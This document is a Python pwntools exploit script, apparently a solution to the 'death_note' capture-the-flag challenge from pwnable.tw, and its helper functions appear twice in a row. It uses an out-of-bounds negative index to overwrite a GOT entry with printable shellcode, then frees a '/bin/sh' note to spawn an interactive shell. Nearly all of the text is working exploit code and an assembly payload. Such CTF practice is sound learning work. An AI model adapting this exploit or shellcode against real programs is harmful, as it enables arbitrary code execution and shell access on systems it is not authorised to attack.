from pwn import *
def cmd(c):
	p.sendlineafter("choice :",str(c))
def add(idx,name="A\n"):
	cmd(1)
	p.sendlineafter("Index :",str(idx))
	p.sendafter("Name :",name)
def show(idx):
	cmd(2)
	p.sendlineafter("Index :",str(idx))
def free(idx):
	cmd(3)
	p.sendlineafter("Index :",str(idx))
def pwn(addr):
	idx=0xffffffff
	while(addr!=(idx*4+0x804a060) % 0x100000000):
		idx-=1
	return idx-0x100000000
#context.log_level='debug'
from pwn import *
def cmd(c):
	p.sendlineafter("choice :",str(c))
def add(idx,name="A\n"):
	cmd(1)
	p.sendlineafter("Index :",str(idx))
	p.sendafter("Name :",name)
def show(idx):
	cmd(2)
	p.sendlineafter("Index :",str(idx))
def free(idx):
	cmd(3)
	p.sendlineafter("Index :",str(idx))
def pwn(addr):
	idx=0xffffffff
	while(addr!=(idx*4+0x804a060) % 0x100000000):
		idx-=1
	return idx-0x100000000
#context.log_level='debug'
shellcode='''
push eax
pop ebx
pop eax
pop eax
push edx
push 0x40
pop edx

sub al,0x2e
sub byte ptr[eax + 0x23] , dl
sub byte ptr[eax + 0x23] , dl
push 0x33
pop edx
sub byte ptr[eax + 0x22] , dl
pop edx

push 0x6b
pop eax
sub al,0x60
'''
shellcode=asm(shellcode)
p=process("./death_note")
#p=remote("chall.pwnable.tw",10201)
#gdb.attach(p,'b *0x8048873')
context.log_level='debug'
add(pwn(0x804a014),shellcode+"\n")
add(1,"/bin/sh\n")
free(1)
p.interactive()

